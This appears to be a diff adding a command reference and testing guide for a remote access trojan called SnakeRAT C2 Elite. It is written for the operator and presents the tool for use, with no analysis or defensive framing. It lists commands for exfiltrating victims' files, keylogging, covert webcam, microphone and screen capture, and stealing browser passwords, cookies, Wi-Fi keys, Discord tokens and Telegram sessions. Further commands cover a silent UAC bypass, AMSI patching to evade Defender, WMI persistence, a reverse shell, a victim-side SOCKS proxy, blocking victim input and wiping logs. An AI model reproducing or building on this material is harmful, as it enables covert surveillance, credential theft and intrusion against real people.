@@ -1,0 +1,213 @@
+SNAKERAT C2 ELITE - COMMAND REFERENCE & TESTING GUIDE
+=====================================================
+
+This document provides a comprehensive list of all commands available in the SnakeRAT C2 system, including their descriptions, usage, and recommended testing procedures.
+
+-------------------------------------------------------------------------------
+1. SESSION & CONNECTION MANAGEMENT
+-------------------------------------------------------------------------------
+
+[Command]   [Usage]             [Description]
+clients     clients             List all active/connected bots.
+            Testing: Connect a bot (d.py) and verify it appears in the list.
+
+select      select <id>         Select a specific bot for targeted commands.
+            Testing: Verify the prompt changes to C2@<id> >.
+
+deselect    deselect            Drop selection (commands broadcast to ALL).
+            Testing: Verify the prompt returns to C2 >.
+
+clear       clear               Clear the terminal screen.
+            Testing: Type clear to wipe the shell history.
+
+help        help                Show the comprehensive command help menu.
+            Testing: Type help to see the built-in documentation.
+
+exit        exit                Gracefully close the server.
+            Testing: Type exit and verify the server process terminates.
+
+-------------------------------------------------------------------------------
+2. FILE & DATA MANAGEMENT
+-------------------------------------------------------------------------------
+
+shell       shell <cmd>         Execute CMD/Bash commands.
+            Testing: shell whoami or shell dir. Verify output.
+
+ps          ps <cmd>            Run PowerShell (Windows only).
+            Testing: ps Get-Process. Verify PowerShell output.
+
+script      script <file>       Upload and execute Python script in memory.
+            Testing: script test.py. Verify console print/output.
+
+download    download <path>     Exfiltrate a file from victim to server.
+            Testing: download C:\Windows\win.ini. Check loot/file/.
+
+upload      upload <file>       Upload a file from server to victim.
+            Testing: upload tools/p.exe. Verify file arrives in CWD.
+
+write       write <p> <t>       Write text content to a remote file.
+            Testing: write test.txt "Hello". Use shell type to verify.
+
+browse      browse [path]       List directory contents (cross-platform).
+            Testing: browse C:\. Verify file list returns.
+
+crypt       crypt <p> <act>     Encrypt/Decrypt files (AES-256).
+            Testing: crypt data.txt encrypt. Verify scrambled content.
+
+drives      drives              List all logical drives and labels.
+            Testing: Type drives. Verify C:, D:, etc. appear.
+
+-------------------------------------------------------------------------------
+3. SURVEILLANCE & RECORDING
+-------------------------------------------------------------------------------
+
+screenshot  screenshot [h]      Capture JPEG screenshot of desktop.
+            Testing: screenshot. Check loot/screenshot/ folder.
+
+webcam      webcam [res]        Capture single frame from webcam.
+            Testing: webcam 1280x720. Check loot/webcam/ folder.
+
+mic         mic <sec>           Record audio from microphone to WAV.
+            Testing: mic 5. Check loot/microphone/ and play WAV.
+
+keylog      keylog <act>        Start/Stop/Dump/Clear the keylogger.
+            Testing: keylog start, type keys, keylog dump.
+
+clip        clip <get/set>      Steal or overwrite the system clipboard.
+            Testing: clip set "Hacked". Paste on victim machine.
+
+window      window              Get the title of the active window.
+            Testing: Switch active windows on victim for results.
+
+wlog        wlog <act>          Background window activity logger path.
+            Testing: wlog start, change apps, wlog dump.
+
+stream      stream start        Start live low-latency screen streaming.
+            Testing: OpenCV window should open on the server.
+
+wcam        wcam start          Start live low-latency webcam streaming.
+            Testing: OpenCV webcam window should open.
+
+recstream   recstream <act>     Record screen stream to MP4 file.
+            Testing: recstream start 10. Check loot/recordings/.
+
+recwcam     recwcam <act>       Record webcam stream to MP4 file.
+            Testing: recwcam start. Check loot/recordings/.
+
+-------------------------------------------------------------------------------
+4. CREDENTIAL HARVESTING
+-------------------------------------------------------------------------------
+
+passwords   passwords           Extract saved browser passwords.
+            Testing: Check loot/passwords/ for decrypted JSON.
+
+cookies     cookies [url]       Extract browser cookies (SQLite).
+            Testing: Check loot/cookies/ for SQLITE/JSON data.
+
+wifi        wifi                Extract Wi-Fi SSIDs and plaintext keys.
+            Testing: Verify list of networks and passwords appears.
+
+chromelevator chromelevator     Run advanced browser data extractor.
+            Testing: Check loot/browser_ext/ for results.
+
+discord     discord             Steal Discord auth tokens.
+            Testing: Verify tokens are saved to loot/discord_tokens/.
+
+telegram    telegram            Package Telegram session (tdata) to ZIP.
+            Testing: Check loot/telegram_session/ for ZIP file.
+
+outlook     outlook             Find Outlook profiles and .pst/.ost paths.
+            Testing: Verify it returns absolute data file paths.
+
+-------------------------------------------------------------------------------
+5. PERSISTENCE & PRIVILEGE
+-------------------------------------------------------------------------------
+
+persist     persist             Install multi-vector persistence.
+            Testing: Reboot victim, verify bot auto-reconnects.
+
+unpersist   unpersist           Remove all persistence mechanisms.
+            Testing: Verify bot does NOT reconnect after reboot.
+
+elevate     elevate             Trigger a UAC prompt for Admin rights.
+            Testing: Accept prompt on victim. Verify Admin: True.
+
+uac         uac <program>       Silent UAC bypass (fodhelper method).
+            Testing: uac cmd.exe. Verify high-integrity CMD opens.
+
+amsi        amsi                Patch AMSI in memory (Defender bypass).
+            Testing: Verify "AMSI Patch Successful" in server logs.
+
+wmi         wmi <cmd>           Install stealthy WMI event persistence.
+            Testing: Check WMI subscriptions on victim machine.
+
+-------------------------------------------------------------------------------
+6. NETWORK & LATERAL MOVEMENT
+-------------------------------------------------------------------------------
+
+sysinfo     sysinfo             Full hardware and software profile.
+            Testing: Verify OS, RAM, and Public IP return.
+
+process     process <act>       List or kill running processes.
+            Testing: process list. Verify top-100 processes appear.
+
+registry    reg <act> <p>       CRUD operations on Windows Registry.
+            Testing: registry read HKCU\Software\Microsoft\...\Run.
+
+scan        scan <ip> <p>       TCP port scanner with banner grabbing.
+            Testing: scan 127.0.0.1 80,443. Check for open ports.
+
+socks       socks <port>        Start a SOCKS5 proxy on the victim.
+            Testing: Tunnel traffic through victim_ip:<port>.
+
+revshell    revshell <i/p>      Spawn a reverse shell back to attacker.
+            Testing: Run listener (nc), then run revshell.
+
+netstat     netstat             List active network connections.
+            Testing: Verify local/remote IP pairs return.
+
+arp         arp                 Dump the ARP table (neighbor discovery).
+            Testing: Verify MAC/IP mappings return.
+
+av          av                  Detect installed Antivirus software.
+            Testing: Verify product name and state appears.
+
+-------------------------------------------------------------------------------
+7. INTERACTION & STEALTH
+-------------------------------------------------------------------------------
+
+url         url <link>          Open a URL in the default browser.
+            Testing: Verify browser opens on browser.
+
+msg         msg <text>          Pop up a system message box.
+            Testing: Verify dialog shows on victim screen.
+
+wallpaper   wallpaper <p>       Change the desktop wallpaper.
+            Testing: Verify desktop background changes.
+
+power       power <act>         Lock/Shutdown/Reboot the machine.
+            Testing: power lock. Verify workstation locks.
+
+input       input <act>         Remote Mouse/Keyboard control.
+            Testing: input move 500 500. Verify cursor moves.
+
+block       block <on/off>      Block victim mouse and keyboard input.
+            Testing: block on. Verify victim cannot use peripherals.
+
+browser_kill browser_kill        Force close all running browsers.
+            Testing: Open Chrome, run command, verify kill.
+
+autorun     autorun <json>      Set commands to run on every reconnect.
+            Testing: Verify reconnect triggers selected command.
+
+abort       abort [id]          Kill a running background task.
+            Testing: Start mic recording, abort it immediately.
+
+clean       clean               Wipe shell and activity history logs.
+            Testing: Verify PS history is cleared from victim.
+
+destroy     destroy             Full self-destruct and binary deletion.
+            Testing: Verify bot closes and the file is deleted.
+
+rdp         rdp [adduser]       Enable Remote Desktop + Firewall.
+            Testing: Connect via mstsc using generated credentials.
